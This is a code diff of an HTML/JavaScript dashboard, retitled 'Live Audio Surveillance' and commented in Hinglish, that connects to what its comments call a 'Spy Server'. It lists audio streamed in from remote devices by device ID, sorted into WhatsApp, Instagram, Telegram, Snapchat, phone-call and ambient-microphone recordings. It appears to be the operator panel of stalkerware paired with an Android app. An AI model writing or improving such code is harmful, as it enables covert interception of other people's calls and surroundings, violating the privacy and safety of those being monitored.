@@ -29,6 +29,7 @@
         h1 {
             text-align: center;
             color: var(--text-color);
+            margin-bottom: 30px;
         }
 
         /* Tabs Styling */
@@ -36,7 +37,7 @@
             display: flex;
             justify-content: center;
             gap: 10px;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             flex-wrap: wrap;
         }
 
@@ -49,11 +50,15 @@
             border-radius: 5px;
             font-weight: bold;
             transition: 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
         .tab-btn:hover, .tab-btn.active {
             background-color: var(--text-color);
-            transform: scale(1.05);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(233, 69, 96, 0.4);
         }
 
         /* Recording List Styling */
@@ -71,13 +76,23 @@
             align-items: center;
             border-left: 5px solid var(--text-color);
             box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-            animation: fadeIn 0.5s ease-in;
+            animation: slideIn 0.4s ease-out;
+            transition: transform 0.2s;
+        }
+
+        .recording-card:hover {
+            transform: translateX(5px);
         }
 
         .app-icon {
-            font-size: 30px;
+            font-size: 28px;
             width: 50px;
-            text-align: center;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.05);
             margin-right: 15px;
         }
 
@@ -87,6 +102,7 @@
         .icon-telegram { color: #0088cc; }
         .icon-snapchat { color: #FFFC00; text-shadow: 0 0 2px black; }
         .icon-call { color: #34b7f1; }
+        .icon-mic { color: #e94560; }
 
         .info {
             flex-grow: 1;
@@ -94,103 +110,160 @@
 
         .info h3 {
             margin: 0;
-            font-size: 18px;
+            font-size: 16px;
+            font-weight: 600;
         }
 
         .info p {
             margin: 5px 0 0;
             font-size: 12px;
-            color: #ccc;
+            color: #aaa;
+        }
+
+        .info .device-id {
+            font-size: 11px;
+            color: #666;
+            margin-top: 2px;
+            display: block;
         }
 
         audio {
-            height: 40px;
+            height: 35px;
             outline: none;
             border-radius: 20px;
+            max-width: 250px;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Status Bar */
+        #status-msg {
+            text-align: center;
+            color: #aaa;
+            font-size: 14px;
+            margin-top: 50px;
         }
     </style>
 </head>
 <body>
 
-    <h1>🎧 Call Logs & Recordings</h1>
+    <h1>🎧 Live Audio Surveillance</h1>
 
     <div class="tabs">
         <button class="tab-btn active" onclick="filterRecordings('all')">All</button>
         <button class="tab-btn" onclick="filterRecordings('WhatsApp')"><i class="fab fa-whatsapp"></i> WhatsApp</button>
         <button class="tab-btn" onclick="filterRecordings('Instagram')"><i class="fab fa-instagram"></i> Instagram</button>
         <button class="tab-btn" onclick="filterRecordings('Telegram')"><i class="fab fa-telegram"></i> Telegram</button>
-        <button class="tab-btn" onclick="filterRecordings('Normal Call')"><i class="fas fa-phone"></i> Calls</button>
+        <button class="tab-btn" onclick="filterRecordings('Call')"><i class="fas fa-phone"></i> Calls</button>
+        <button class="tab-btn" onclick="filterRecordings('Mic')"><i class="fas fa-microphone"></i> Mic</button>
     </div>
 
     <div class="recording-container" id="recordingList">
-        <p style="text-align:center; color:#ccc;">Waiting for recordings...</p>
+        </div>
+    
+    <div id="status-msg">
+        <i class="fas fa-satellite-dish"></i> Waiting for live incoming audio...
     </div>
 
     <script>
+        // ✅ 1. Connect to Server
         const socket = io();
-        let allRecordings = []; // Sara data yahan store hoga
+        
+        // Array to store data in RAM (Server se aane wala data yahan jama hoga)
+        let allRecordings = []; 
+        let currentFilter = 'all';
 
-        // 1. Server se nayi recording aayi
-        socket.on('new-call-recording', (data) => {
-            console.log("New Recording Received:", data);
-            
-            // Data ko list me sabse upar add karo
-            allRecordings.unshift(data);
-            
-            // UI Update karo
-            renderList(); 
+        console.log("🔌 Connecting to Spy Server...");
+
+        socket.on('connect', () => {
+            console.log("✅ Connected to Server! ID:", socket.id);
+            document.getElementById('status-msg').innerHTML = '<i class="fas fa-wifi"></i> Connected. Waiting for data...';
         });
 
-        // 2. Dummy Data for Testing (Jab tak Android App ready nahi hai)
-        // Isko baad me hata dena
-        window.onload = function() {
-            // Fake data taaki design check kar sako
-            const dummyData = [
-                { app: 'WhatsApp', time: '10:30 PM', date: '23 Jan', url: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3' },
-                { app: 'Normal Call', time: '09:15 PM', date: '23 Jan', url: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3' },
-                { app: 'Instagram', time: '08:00 PM', date: '23 Jan', url: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3' }
-            ];
-            allRecordings = dummyData;
+        // ✅ 2. Listen for 'new-audio' event from Server
+        // (Server code: io.emit('new-audio', { device_id, url, name }))
+        socket.on('new-audio', (data) => {
+            console.log("🔊 New Audio Received:", data);
+            
+            // Hide waiting message
+            document.getElementById('status-msg').style.display = 'none';
+
+            // Parse Data (Filename se App Name aur Date nikalo)
+            const processedData = processAudioData(data);
+
+            // Add to array (Sabse upar)
+            allRecordings.unshift(processedData);
+
+            // Refresh UI
             renderList();
-        };
+        });
 
-        // 3. UI Render Karne ka Logic
-        function renderList(filter = 'all') {
+        // ✅ 3. Helper: Process Raw Data from Server
+        function processAudioData(data) {
+            let appName = "Unknown";
+            let rawName = data.name.toLowerCase();
+
+            // Filename check karke App Name decide karo
+            if (rawName.includes("whatsapp")) appName = "WhatsApp";
+            else if (rawName.includes("instagram")) appName = "Instagram";
+            else if (rawName.includes("telegram")) appName = "Telegram";
+            else if (rawName.includes("snapchat")) appName = "Snapchat";
+            else if (rawName.includes("mic") || rawName.includes("ambient")) appName = "Mic"; // Ambient recording
+            else appName = "Normal Call";
+
+            // Timestamp (Agar filename me timestamp hai to wahan se lo, nahi to abhi ka time)
+            let date = new Date().toLocaleDateString();
+            let time = new Date().toLocaleTimeString();
+
+            return {
+                device_id: data.device_id,
+                app: appName,
+                date: date,
+                time: time,
+                url: data.url
+            };
+        }
+
+        // ✅ 4. Render Logic (Display List)
+        function renderList() {
             const container = document.getElementById('recordingList');
-            container.innerHTML = ''; // Pehle list saaf karo
+            container.innerHTML = ''; // Clear current list
 
-            // Filter lagao
+            // Filter Data
             const filteredData = allRecordings.filter(item => {
-                if (filter === 'all') return true;
-                return item.app === filter;
+                if (currentFilter === 'all') return true;
+                if (currentFilter === 'Call') return item.app === "Normal Call";
+                return item.app === currentFilter;
             });
 
             if(filteredData.length === 0) {
-                container.innerHTML = '<p style="text-align:center;">No recordings found.</p>';
+                if(allRecordings.length > 0) {
+                     container.innerHTML = `<p style="text-align:center; color:#666;">No recordings for ${currentFilter}</p>`;
+                }
                 return;
             }
 
-            // HTML banao har recording ka
+            // Create HTML Cards
             filteredData.forEach(rec => {
                 const iconClass = getIconClass(rec.app);
+                const iconIcon = getIconIcon(rec.app);
                 
                 const card = `
                     <div class="recording-card">
                         <div class="app-icon ${iconClass}">
-                            <i class="${getIconIcon(rec.app)}"></i>
+                            <i class="${iconIcon}"></i>
                         </div>
                         <div class="info">
                             <h3>${rec.app}</h3>
-                            <p>${rec.date} | ${rec.time}</p>
+                            <p>${rec.date} • ${rec.time}</p>
+                            <span class="device-id">Device: ${rec.device_id}</span>
                         </div>
-                        <audio controls>
-                            <source src="${rec.url}" type="audio/mpeg">
-                            Your browser does not support the audio element.
+                        <audio controls controlsList="nodownload">
+                            <source src="${rec.url}" type="video/mp4"> <source src="${rec.url}" type="audio/mpeg">
+                            Your browser not support audio.
                         </audio>
                     </div>
                 `;
@@ -198,32 +271,34 @@
             });
         }
 
-        // 4. Tab click hone par Filter karna
+        // ✅ 5. Filter Handler
         function filterRecordings(category) {
-            // Active class change karo buttons pe
-            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-            event.target.classList.add('active');
+            currentFilter = category;
             
-            // List dobara banao filter ke sath
-            renderList(category);
+            // Buttons UI Update
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            event.currentTarget.classList.add('active'); // Use currentTarget specifically for button click
+            
+            renderList();
         }
 
-        // Helper: App ke naam se Icon ka color nikalna
+        // Helpers for Styling
         function getIconClass(appName) {
-            if(appName.includes('WhatsApp')) return 'icon-whatsapp';
-            if(appName.includes('Instagram')) return 'icon-instagram';
-            if(appName.includes('Telegram')) return 'icon-telegram';
-            if(appName.includes('Snapchat')) return 'icon-snapchat';
+            if(appName === 'WhatsApp') return 'icon-whatsapp';
+            if(appName === 'Instagram') return 'icon-instagram';
+            if(appName === 'Telegram') return 'icon-telegram';
+            if(appName === 'Snapchat') return 'icon-snapchat';
+            if(appName === 'Mic') return 'icon-mic';
             return 'icon-call';
         }
 
-        // Helper: App ke naam se FontAwesome Icon nikalna
         function getIconIcon(appName) {
-            if(appName.includes('WhatsApp')) return 'fab fa-whatsapp';
-            if(appName.includes('Instagram')) return 'fab fa-instagram';
-            if(appName.includes('Telegram')) return 'fab fa-telegram';
-            if(appName.includes('Snapchat')) return 'fab fa-snapchat-ghost';
-            return 'fas fa-phone';
+            if(appName === 'WhatsApp') return 'fab fa-whatsapp';
+            if(appName === 'Instagram') return 'fab fa-instagram';
+            if(appName === 'Telegram') return 'fab fa-telegram';
+            if(appName === 'Snapchat') return 'fab fa-snapchat-ghost';
+            if(appName === 'Mic') return 'fas fa-microphone-alt';
+            return 'fas fa-phone-alt';
         }
 
     </script>
